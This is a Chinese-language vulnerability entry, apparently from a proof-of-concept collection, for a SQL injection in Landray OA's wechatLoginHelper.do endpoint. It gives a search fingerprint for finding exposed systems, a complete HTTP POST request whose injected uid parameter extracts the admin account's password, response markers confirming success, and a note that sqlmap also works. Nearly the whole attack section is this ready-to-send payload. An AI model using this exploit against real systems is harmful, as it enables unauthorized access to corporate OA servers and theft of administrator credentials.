﻿# 蓝凌OA wechatloginhelper sql注入漏洞

> 更新时间：2024-02-29

> 漏洞编号：

> 漏洞说明：蓝凌智能OA是一款针对中小企业的移动化智能办公产品 ，融合了钉钉数字化能力与蓝凌多年OA产品与服务经验，能全面满足企业日常办公在线、企业文化在线、客户管理在线、人事服务在线、行政务服务在线等需求。蓝凌OA  wechatLoginHelper.do接口处存在SQL注入漏洞，恶意攻击者可能会利用此漏洞获取服务器敏感信息或权限。导致服务器失陷

> 漏洞特征：app="Landray-OA系统"

> 验证脚本：HTTP

```
POST /third/wechat/wechatLoginHelper.do HTTP/1.1
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Type: application/x-www-form-urlencoded

method=edit&uid=1'and+(SELECT+'password-is:'%2BfdPassword%2B'----'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin')=1+and+'1'='1
```

> 响应代码特征：200

> 响应内容特征：password-is

> 上传文件定位：

> 验证文件来源：蓝凌OA wechatloginhelper sql注入漏洞.poc

> 备注说明：使用SQLmap也能跑出来
